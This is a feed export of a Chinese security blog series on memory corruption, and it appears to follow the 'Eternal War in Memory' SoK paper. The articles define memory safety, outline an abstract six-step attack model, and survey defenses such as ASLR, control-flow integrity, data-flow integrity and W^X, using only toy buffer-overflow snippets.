&lt;p&gt;代码完整性保证程序中的代码不可写性，可以将含有代码的所有内存页面设置为read-only,所有现代CPU都支持此操作。但是，代码完整性并不支持自我修改(self-modifying)的代码以及即时(Just-In-Time, JIT)编译。代码指针完整性保护指针不被修改，对于不变指针，如全局偏移表、虚拟函数表（vtable),可将其内存页设置read-only。但大部分指针，如定义的函数指针或保存的返回地址必须是可写的。另外，就算内存中所有的函数指针都能实施代码指针完整性，并不能防御use-after-free攻击，例如，通过悬挂指针读取错误的vtable&lt;br&gt;来改变程序的控制流并不会涉及内存中的覆盖代码指针操作。&lt;/p&gt;
&lt;p&gt;数据完整性的实施近似空间安全保护，但并没有实施时域安全保护。数据完整性包括基于对象的完整性保护以及基于points-to集合的完整性保护。基于对象的完整性保护利用静态指针分析来鉴别出不安全的指针集(比如可能会越界的指针)以及指针的points-to集合，然后在代码中插入用影子内存跟踪对象的创建与释放的代码，当对不安全的指针进行写操作或引用操作时会检测指针的位置是否标记在影子内存中。基于points-to集合的完整性保护在基于对象的完整性保护上加了一个限制，每个解引用只能写它自己指向的集合对象，是对其保护的加强。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Step 4: ISR(对应指针转向攻击者特定代码),ASLR（对应指向shellcode或者gadget的地址),DSR(对应解析输出的数据变量).&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;ISR随机化系统指令来保护代码破坏攻击，随着硬件的更新与发展,ISR技术已经废弃；ASLR随机化代码和数据的存储位置来防御控制流劫持攻击，如果payload(指恶意代码中执行恶意操作的部分）在虚拟内存空间的地址不是固定的，攻击者就无法转移控制流。ASLR也是目前用来保护劫持攻击运用最广泛的技术，然后ASLR的随机化是可预测的，尤其是32位机器，heap-spraying以及JIT-spraying技术可以多次填充payload使随机化失效；&lt;/p&gt;
&lt;p&gt;DSR将存储在内存中的数据形式，而不是存储位置，进行随机化。它为每个变量,包括指针，生成不同的key并进行加密操作，数据的每次读取/存储操作都多了个加解密过程。该方法在代码注入之前都要对指针进行静态分析，overhead较大，但保护比较健壮，能有效防止信息泄露，还能防御控制流劫持以及数据攻击。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Step 5: 控制流完整性（control-flow integrity,对应利用间接跳转指令 call/jump 引用指针，利用返回指令引用指针)以及数据流完整性(data-flow integrity，对应引用破坏后的数据变量).&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;控制流完整性包括动态返回完整性以及静态控制流图完整性。前文提到的栈粉碎性保护机制不能保护间接调转（call and jump)，不能防御直接修改破坏以及信息泄露，但开销小，兼容性好，所以运用比较广泛。影子栈技术能够解决栈粉碎性保护的信息泄露以及直接修改破坏问题，它把返回地址存入隔离的影子栈中，当函数返回时，对原有栈和影子栈两处保存的值做比较，已保证不被篡改。为了防御控制流劫持，不但要保护返回值，还要保护间接跳转，静态控制流图完整性的方式标记所有的call,jump，并将其标记信息存储在特殊的影子内存中或直接放进代码里; 数据流完整性在数据被使用前，通过检查read指令检测数据是否被破坏。它使用静态points-to分析构建一个全局的可达定义集合（reaching definition sets)，保证数据变量最近一次被写是通过程序中的写指令写入的，而不是攻击者可控制的写入。有关reaching definition sets的定义可参考 &lt;a href=&quot;https://en.wikipedia.org/wiki/Reaching_definition&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;wikipedia page on Reaching definition&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Step 6: 不可写数据策略(Non-executable data,对应执行注入的shellcode).&lt;/em&gt;&lt;/strong&gt;&lt;br&gt;Non-executable data 保护栈、堆之类的内存页面不可执行，只需要设置内存页面的执行位即可。实际上Non-executable data策略与代码完整性结合就是W⊕X机制。&lt;/p&gt;
&lt;p&gt;每个攻击过程对应的防御机制都已讲完。横向来看，所有攻击模型的每个步骤都有多个防御方法；纵向来看，每种攻击在不同的实施阶段也有不同的防御方法，如控制流劫持攻击，从Step1-6分别有，内存安全性机制（step 1-2),代码指针完整性(step 3),ASLR(step 4), 控制流完整性（step 5）以及不可写数据策略（step 6)不同的防御机制。要阻止某种攻击或多种攻击，需要结合多种防御机制，每种机制也都有其优势与弱点。评判防御机制的性质，可从以下方面去衡量，保护强度、误报率、漏报率、性能开销、内存开销、兼容性，是否模块化等。&lt;/p&gt;
&lt;p&gt;至此，内存持久战系列文章就到这里了，水平有限，很多不到位的地方欢迎补充修正。 回顾一下，最后用下面这张图总结，就清晰明了了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppf1.com1.z0.glb.clouddn.com/memorywar.png&quot; alt=&quot;memorywar&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;References&quot;&gt;&lt;a href=&quot;#References&quot; class=&quot;headerlink&quot; title=&quot;References&quot;&gt;&lt;/a&gt;References&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;http://www.drdobbs.com/security/anatomy-of-a-stack-smashing-attack-and-h/240001832?pgno=1&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Anatomy of a Stack Smashing Attack and How GCC Prevents It
&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.blackhat.com/presentations/bh-usa-08/Shacham/BH_US_08_Shacham_Return_Oriented_Programming.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Return-oriented Programming: Exploitation without Code Injection&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Reference_monitor&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;wikipedia page on reference monior&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cs.virginia.edu/~weimer/p/p477-necula.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;CCured&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://nebelwelt.net/publications/files/13Oakland.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;S&amp;amp;P’13 Eternal War in Memory &lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;本文遵守Attribution-NonCommercial-NoDerivatives 4.0 International License (CC BY-NC-ND 4.0)&lt;/p&gt;
&lt;p&gt;作者[新浪微博：&lt;a href=&quot;http://weibo.com/2767520802/profile?rightmod=1&amp;amp;wvr=6&amp;amp;mod=personinfo&amp;amp;is_all=1&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;@diting0x&lt;/a&gt;] &lt;/p&gt;
&lt;p&gt;如转载本文请注明出处:&lt;a href=&quot;http://www.chongh.wiki/blog/2016/02/23/memorywar-defense/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.chongh.wiki/blog/2016/02/23/memorywar-defense/&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;继前两篇文章 &lt;a href=&quot;http://www.chongh.wiki/blog/2016/02/17/memory-safety/&quot;&gt;内存持久战-内存安全性&lt;/a&gt;, &lt;a href=&quot;http://www.chongh.wiki/blog/2016/02/18/memorywar-attack/&quot;&gt;内存持久战-攻击模型&lt;/a&gt;, 再加上防御措施，才能算是完整的内存战争。本文首先介绍目前广泛部署的防御机制，然后根据 &lt;a href=&quot;http://www.chongh.wiki/blog/2016/02/18/memorywar-attack/&quot;&gt;内存持久战-攻击模型&lt;/a&gt; 每一步实施的攻击破坏介绍相对应的防御细节。&lt;/p&gt;
    
    </summary>
    
      <category term="security" scheme="http://yoursite.com/categories/security/"/>
    
    
      <category term="Security" scheme="http://yoursite.com/tags/Security/"/>
    
      <category term="Memory" scheme="http://yoursite.com/tags/Memory/"/>
    
      <category term="System" scheme="http://yoursite.com/tags/System/"/>
    
      <category term="Attack" scheme="http://yoursite.com/tags/Attack/"/>
    
      <category term="Defense" scheme="http://yoursite.com/tags/Defense/"/>
    
  </entry>
  
  <entry>
    <title>Memory page classificatition</title>
    <link href="http://yoursite.com/blog/2016/02/20/memory-classification/"/>
    <id>http://yoursite.com/blog/2016/02/20/memory-classification/</id>
    <published>2016-02-21T03:03:23.000Z</published>
    <updated>2016-04-21T01:23:47.000Z</updated>
    
    <content type="html">&lt;p&gt;即将介绍内存页面分类技术&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;即将介绍内存页面分类技术&lt;/p&gt;

    
    </summary>
    
      <category term="operating-system" scheme="http://yoursite.com/categories/operating-system/"/>
    
    
  </entry>
  
  <entry>
    <title>Understanding your kernel oops</title>
    <link href="http://yoursite.com/blog/2016/02/20/kernel-opps/"/>
    <id>http://yoursite.com/blog/2016/02/20/kernel-opps/</id>
    <published>2016-02-21T03:01:20.000Z</published>
    <updated>2016-04-21T01:23:47.000Z</updated>
    
    <content type="html">&lt;p&gt;即将介绍下oops错误以及如何调试&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;即将介绍下oops错误以及如何调试&lt;/p&gt;

    
    </summary>
    
      <category term="debugging" scheme="http://yoursite.com/categories/debugging/"/>
    
    
  </entry>
  
  <entry>
    <title>Valgrind 内存检测</title>
    <link href="http://yoursite.com/blog/2016/02/20/valgrind-memory/"/>
    <id>http://yoursite.com/blog/2016/02/20/valgrind-memory/</id>
    <published>2016-02-21T02:55:45.000Z</published>
    <updated>2016-04-21T01:23:47.000Z</updated>
    
    <content type="html">&lt;p&gt;即将介绍&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;即将介绍&lt;/p&gt;

    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>内存持久战-攻击模型</title>
    <link href="http://yoursite.com/blog/2016/02/18/memorywar-attack/"/>
    <id>http://yoursite.com/blog/2016/02/18/memorywar-attack/</id>
    <published>2016-02-19T03:06:45.000Z</published>
    <updated>2016-04-26T00:27:50.000Z</updated>
    
    <content type="html">&lt;p&gt;内存破坏是计算机安全中亘古不变的话题。内存破坏也被看作是top three危险的软件错误。像C/C++这种底层语言很容易引来这些bugs. 这些程序语言无法对内存安全性的保证，以至于让一些攻击者利用内存bugs改变程序行为或甚至控制整个控制流（control-flow).  要了解什么是内存安全性，可参考上一篇文章：&lt;a href=&quot;http://www.chongh.wiki/blog/2016/02/17/memory-safety/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;内存持久战-内存安全性&lt;/a&gt;.  然而，一种最显而易见的解决方案就是避免这些容易引起内存破坏的程序语言，用一种内存安全的程序语言去重写这些程序。显然这是不切实际的，比如重写整个OS？&lt;br&gt;尽管papers的许多防御措施层出不穷，但大部分都无法应用到工业上，归结于以下问题：性能开销太大、与现有的程序特性并不兼容、不够健壮、不够完整、依赖于编译器或源码等等。&lt;br&gt;对内存的破坏与保护是一场持久战。本文重在总结利用内存破坏的相关攻击及其实施过程。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h3 id=&quot;基本攻击类型&quot;&gt;&lt;a href=&quot;#基本攻击类型&quot; class=&quot;headerlink&quot; title=&quot;基本攻击类型&quot;&gt;&lt;/a&gt;基本攻击类型&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;代码破坏攻击(Code corruption):  攻击者在内存中覆盖程序代码，执行自己写入的代码.&lt;/li&gt;
&lt;li&gt;数据流劫持（Control-flow hijack）: 攻击者重写程序的返回地址或跳转地址，转而执行自己的代码（shell code).&lt;/li&gt;
&lt;li&gt;数据攻击（Data-only attack）: 攻击者并不会修改程序控制流，而是操作程序中的关键数据获取额外权限或泄露重要信息。&lt;/li&gt;
&lt;li&gt;信息泄露（Information leak attack）:任何类型的内存错误都有可能导致内存内容的泄露 &lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;构建攻击模型&quot;&gt;&lt;a href=&quot;#构建攻击模型&quot; class=&quot;headerlink&quot; title=&quot;构建攻击模型&quot;&gt;&lt;/a&gt;构建攻击模型&lt;/h3&gt;&lt;p&gt;攻击者要实施一次完整的攻击，首先要触发内存错误，具体可按照以下六个步骤进行：&lt;br&gt;注：&lt;em&gt;Step 1&amp;amp;2&lt;/em&gt; 是上述攻击模型通用的过程，必不可少，目的是为了触发内存错误。至于 &lt;em&gt;Step 3-6&lt;/em&gt;，有些攻击需要完整的步骤才能执行，有些则在前几个阶段就可以完成。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Step 1: 让指针无效&lt;/em&gt;&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;要让指针无效，可以强制让指针越界（out of bounds)，引用越界指针引发空间错误（spatial error)。包括：触发未经过检测的空间分配失败错误（allocation failure),这时指针将变成空指针；在循环中不作边界检测，不断递增或递减数组指针，让指针指向数组边界之外的内存空间导致缓冲区溢出；索引越界，一般由整数溢出、截断、对齐、错误的指针映射导致。&lt;/p&gt;
&lt;p&gt;或可让指针指向已经被删除的对象,这时指针称为悬挂指针(dangling pointer).比如，利用不正确的异常处理器（exception handler)回收对象，但并不重新初始化指向这个对象的指针。&lt;br&gt;引用悬挂指针引发时域错误（temporal error). 时域错误也称为use-after-free漏洞，因为引用（used)悬挂指针是在指针指向的内存区域已经被回收（freed)到内存管理系统之后. 大部分此类的错误指针在heap上分配的对象，但局部变量的指针分配给全局变量后会造成指针逃逸(escape)出局部作用域，在函数返回或栈上的局部变量被删除后逃逸的指针将会变成悬挂指针。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Step 2: 强制让程序引用（读或写）无效指针&lt;/em&gt;&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Step 3: 利用无效指针修改对象&lt;/em&gt;&lt;/strong&gt;。修改的对象包括数据指针、代码指针、代码、数据变量，以及输出数据变量&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Step 4: 偏离源程序执行&lt;/em&gt;&lt;/strong&gt;。可将修改的对象转向攻击者特定的代码（code curruption attack)、也可指向shellcode或者gadget(指一些指令序列）的地址、修改变量特定值、解析输出的数据变量（information leak attack). 注：此时，code currupttion attack与information lead attack过程都已全部完成。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Step 5: 使用修改后的对象&lt;/em&gt;&lt;/strong&gt;。包括利用间接跳转指令 &lt;em&gt;call/jump&lt;/em&gt; 引用指针，利用返回指令引用指针，以及引用破坏后的数据变量（data-only attack).至此，数据攻击过程已全部完成。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Step 6: 执行恶意代码&lt;/em&gt;&lt;/strong&gt;。包括重用现有的函数/gadgets以及执行注入的shellcode(control-flow hijack).至此，control-flow hijack过程已全部完成。&lt;/p&gt;
&lt;p&gt;最后看两张图，分别是control-flow hijack利用越界指针与悬挂指针劫持控制流的完整过程：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppf1.com1.z0.glb.clouddn.com/hijack-bound.png&quot; alt=&quot;hijack-bound&quot;&gt;&lt;br&gt;&lt;img src=&quot;http://7xppf1.com1.z0.glb.clouddn.com/hijack-dangling.png&quot; alt=&quot;hijack-dangling&quot;&gt;&lt;/p&gt;
&lt;p&gt;既然谈论的是持久战，针对内存破坏相关攻击的防御措施将在下一篇文章&lt;a href=&quot;http://www.chongh.wiki/blog/2016/02/23/memorywar-defense/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;内存持久战-防御机制&lt;/a&gt;详细介绍。&lt;/p&gt;
&lt;h3 id=&quot;References&quot;&gt;&lt;a href=&quot;#References&quot; class=&quot;headerlink&quot; title=&quot;References&quot;&gt;&lt;/a&gt;References&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;https://nebelwelt.net/publications/files/13Oakland.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;S&amp;amp;P’13 Eternal War in Memory &lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&quot;Acknowledgement&quot;&gt;&lt;a href=&quot;#Acknowledgement&quot; class=&quot;headerlink&quot; title=&quot;Acknowledgement&quot;&gt;&lt;/a&gt;Acknowledgement&lt;/h2&gt;&lt;p&gt;本文遵守Attribution-NonCommercial-NoDerivatives 4.0 International License (CC BY-NC-ND 4.0)&lt;/p&gt;
&lt;p&gt;作者[新浪微博：&lt;a href=&quot;http://weibo.com/2767520802/profile?rightmod=1&amp;amp;wvr=6&amp;amp;mod=personinfo&amp;amp;is_all=1&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;@diting0x&lt;/a&gt;] &lt;/p&gt;
&lt;p&gt;转载本文请注明出处:&lt;a href=&quot;http://www.chongh.wiki/blog/2016/02/18/memorywar-attack/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.chongh.wiki/blog/2016/02/18/memorywar-attack/&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;内存破坏是计算机安全中亘古不变的话题。内存破坏也被看作是top three危险的软件错误。像C/C++这种底层语言很容易引来这些bugs. 这些程序语言无法对内存安全性的保证，以至于让一些攻击者利用内存bugs改变程序行为或甚至控制整个控制流（control-flow).  要了解什么是内存安全性，可参考上一篇文章：&lt;a href=&quot;http://www.chongh.wiki/blog/2016/02/17/memory-safety/&quot;&gt;内存持久战-内存安全性&lt;/a&gt;.  然而，一种最显而易见的解决方案就是避免这些容易引起内存破坏的程序语言，用一种内存安全的程序语言去重写这些程序。显然这是不切实际的，比如重写整个OS？&lt;br&gt;尽管papers的许多防御措施层出不穷，但大部分都无法应用到工业上，归结于以下问题：性能开销太大、与现有的程序特性并不兼容、不够健壮、不够完整、依赖于编译器或源码等等。&lt;br&gt;对内存的破坏与保护是一场持久战。本文重在总结利用内存破坏的相关攻击及其实施过程。&lt;/p&gt;
    
    </summary>
    
      <category term="security" scheme="http://yoursite.com/categories/security/"/>
    
    
      <category term="Security" scheme="http://yoursite.com/tags/Security/"/>
    
      <category term="Memory" scheme="http://yoursite.com/tags/Memory/"/>
    
      <category term="System" scheme="http://yoursite.com/tags/System/"/>
    
      <category term="Attack" scheme="http://yoursite.com/tags/Attack/"/>
    
  </entry>
  
  <entry>
    <title>内存持久战-内存安全性</title>
    <link href="http://yoursite.com/blog/2016/02/17/memory-safety/"/>
    <id>http://yoursite.com/blog/2016/02/17/memory-safety/</id>
    <published>2016-02-18T01:07:28.000Z</published>
    <updated>2016-04-26T00:47:28.000Z</updated>
    
    <content type="html">&lt;p&gt;C语言中的buffer overflows, format string attacks等其它的一些vulnerabilities都有一个共同的问题：违背内存安全(Memory Safety)。本文主要讲述如何准确定义内存安全，为什么这些vulnerabilities违背了内存安全。也为后续两篇文章&lt;a href=&quot;http://www.chongh.wiki/blog/2016/02/18/memorywar-attack/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;内存持久战-攻击模型&lt;/a&gt;，&lt;a href=&quot;http://www.chongh.wiki/blog/2016/02/23/memorywar-defense/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;内存持久战-防御机制&lt;/a&gt;做好铺垫。&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;IEEE Security&amp;amp;Privacy’13&lt;/li&gt;
&lt;li&gt;不访问未定义的内存&lt;/li&gt;
&lt;li&gt;无限间距&lt;/li&gt;
&lt;li&gt;Pointers as capabilities&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h3 id=&quot;IEEE-Security-amp-Privacy’13&quot;&gt;&lt;a href=&quot;#IEEE-Security-amp-Privacy’13&quot; class=&quot;headerlink&quot; title=&quot;IEEE Security&amp;amp;Privacy’13&quot;&gt;&lt;/a&gt;IEEE Security&amp;amp;Privacy’13&lt;/h3&gt;&lt;p&gt;发表在IEEE Security&amp;amp;Privacy’13的一篇SoK(Systematization of Knowledge)文章，&lt;a href=&quot;https://nebelwelt.net/publications/files/13Oakland.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Eternal War in Memory &lt;/a&gt;，阐述了一种定义内存安全的通用方法。&lt;br&gt;&lt;strong&gt;&lt;em&gt;Definition 1:&lt;/em&gt;&lt;/strong&gt; 文中提到，一个程序的执行，只要不会出现以下内存访问错误，就是内存安全的：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;1.缓冲区溢出&lt;/li&gt;
&lt;li&gt;2.引用空指针&lt;/li&gt;
&lt;li&gt;3.释放后使用（use after free）&lt;/li&gt;
&lt;li&gt;4.使用未初始化内存&lt;/li&gt;
&lt;li&gt;5.非法释放已经释放过的指针或未分配的指针&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;维基百科 &lt;a href=&quot;https://en.wikipedia.org/wiki/Memory_safety&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;wikipedia page on memory safety&lt;/a&gt; 也有类似的定义。从定义来看，排除这些错误是内存安全本身的定义所导向的，而并非内存安全性的本质。那么，如何将这些错误统一起来？&lt;/p&gt;
&lt;h3 id=&quot;不访问未定义的内存&quot;&gt;&lt;a href=&quot;#不访问未定义的内存&quot; class=&quot;headerlink&quot; title=&quot;不访问未定义的内存&quot;&gt;&lt;/a&gt;不访问未定义的内存&lt;/h3&gt;&lt;p&gt;只有当程序访问未定义的内存时才会产生内存错误，这块内存是在程序中没有具体分配的，例如，&lt;em&gt;heap&lt;/em&gt; 的一部分（通过&lt;em&gt;malloc&lt;/em&gt;)，&lt;em&gt;stack&lt;/em&gt;(作为局部变量或者函数参数），又或者是静态数据区域（作为全局变量). &lt;a href=&quot;http://www.cs.berkeley.edu/~necula/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;George Necula&lt;/a&gt; 在他的&lt;em&gt;CCured&lt;/em&gt;项目中（旨在为C程序实施内存安全性）提到，一个内存安全的程序从来不会去访问未定义的内存。我们可以假设，内存可以无限的大，大到内存地址从不会复用(reused).如此一来，被释放的内存（可以调用&lt;em&gt;free&lt;/em&gt; 或者从函数返回的时候&lt;em&gt;pop&lt;/em&gt;）从不会被重新分配，并且会永久的保持未定义状态。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Definition 2:&lt;/em&gt;&lt;/strong&gt; 不访问未定义的内存就是内存安全的。&lt;br&gt;这种定义明显排除了&lt;em&gt;error 2&lt;/em&gt; 和 &lt;em&gt;error 3&lt;/em&gt;. 如果将&lt;em&gt;allocated&lt;/em&gt; 的定义包括&lt;em&gt;initialized&lt;/em&gt;，又可以排除&lt;em&gt;error 4&lt;/em&gt;. 如果假设&lt;em&gt;free&lt;/em&gt;只能在定义过的内存指针中调用，那又可以排除&lt;em&gt;error 5&lt;/em&gt;. &lt;/p&gt;
&lt;p&gt;不幸的是，&lt;em&gt;Definition 2&lt;/em&gt; 并未排除缓冲区溢出错误，也就是&lt;em&gt;error 1&lt;/em&gt;。 来看一个例子，假定一个标准&lt;em&gt;stack&lt;/em&gt; 布局， 在此定义下，&lt;em&gt;program 1&lt;/em&gt; 的执行会被认为是内存安全的：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;/* Program 1 */&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;int x;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;int buf[4];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;buf[5] =3; /*overwrite*/&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;em&gt;Definition 2&lt;/em&gt; 允许 &lt;em&gt;Program 1&lt;/em&gt; 通过是因为此程序是在合法分配的内存中写数据，甚至写的数据类型也是正确的。但实际上问题在于，数组&lt;em&gt;buf&lt;/em&gt; 的溢出将数据写进了变量&lt;em&gt;x&lt;/em&gt; 中, 显然这是内存不安全的。&lt;/p&gt;
&lt;h3 id=&quot;无限间距&quot;&gt;&lt;a href=&quot;#无限间距&quot; class=&quot;headerlink&quot; title=&quot;无限间距&quot;&gt;&lt;/a&gt;无限间距&lt;/h3&gt;&lt;p&gt;将 &lt;em&gt;Definition 2&lt;/em&gt; 延伸， &lt;em&gt;Program 1&lt;/em&gt; 被看作是内存不安全的。只要加上这个假设： 内存区域分配的间距是无限大的。&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Buf&lt;/em&gt; 和 &lt;em&gt;x&lt;/em&gt; 的分配间距无限大，&lt;em&gt;buf[5]&lt;/em&gt; 将会访问 &lt;em&gt;buf&lt;/em&gt; 区域的边界外部。边界外部是个未定义的内存区域，按照上述定义，就会产生错误。&lt;em&gt;heap&lt;/em&gt; ,静态数据区域对溢出的处理方式类似。&lt;/p&gt;
&lt;p&gt;尽管 &lt;em&gt;Definition 2&lt;/em&gt; 是个很接近让人满意的定义，但事实并未如此。来看 &lt;em&gt;Program 1&lt;/em&gt; 的变形 &lt;em&gt;Program 2&lt;/em&gt;，也是一种缓冲区溢出, &lt;em&gt;Definition 2&lt;/em&gt;  仍然会允许 &lt;em&gt;Program 2&lt;/em&gt; 执行。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;/*Program 2 */&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;struct foo &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   int buf[4];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   int x;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;struct foo *pf -malloc(sizeof(struct foo));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;pf-&amp;gt;buf[5] =3;/*overwrite pf-&amp;gt;x*/&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这里，缓冲区溢出发生在 &lt;em&gt;object&lt;/em&gt; 的内部。我们仍然可以类似的在域间引入无限间距的概念来排除缓存溢出的错误。这并未太背离现实，C标准允许编译器决定不同域的间距。另一方面，程序语言把结构体当做一个单独的&lt;em&gt;object&lt;/em&gt; (从 &lt;em&gt;malloc&lt;/em&gt; 返回的单独指针). 许多程序会把一个结构体映射到另一个结构体，或者会确定好一种间距方案。许多编译器都支持这些操作，但是否可以有一种更好的定义不依赖于这些？&lt;/p&gt;
&lt;h3 id=&quot;Pointers-as-capabilities&quot;&gt;&lt;a href=&quot;#Pointers-as-capabilities&quot; class=&quot;headerlink&quot; title=&quot;Pointers as capabilities&quot;&gt;&lt;/a&gt;Pointers as capabilities&lt;/h3&gt;&lt;p&gt;从 &lt;em&gt;Definition 2&lt;/em&gt; 中，了解到许多概念，比如，定义的（分配的），未定义的（从没有分配的或者分配后回收的),我们假设分配后回收的内存不会再复用。如此一来，只要访问未定义的内存，就会违背内存安全性。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Definition 3:&lt;/em&gt;&lt;/strong&gt; 我们引入这么一个概念, Pointers as capabilities. 也就是说，允许指针的持有者访问一定区域中的内存。一个指针由三个元素组成&lt;em&gt;（p,b,e)&lt;/em&gt;: &lt;em&gt;b&lt;/em&gt; 定义有效的区域，&lt;em&gt;e&lt;/em&gt; 定义边界，&lt;em&gt;p&lt;/em&gt; 代表指针本身。 程序只能操作&lt;em&gt;p&lt;/em&gt;，&lt;em&gt;b&lt;/em&gt; 和&lt;em&gt;e&lt;/em&gt; ,这样做只是为了定义一次执行是否是内存安全的。&lt;/p&gt;
&lt;p&gt;举个例子，看下面的&lt;em&gt;Program 3&lt;/em&gt;以及对应的内存效果图：&lt;/p&gt;
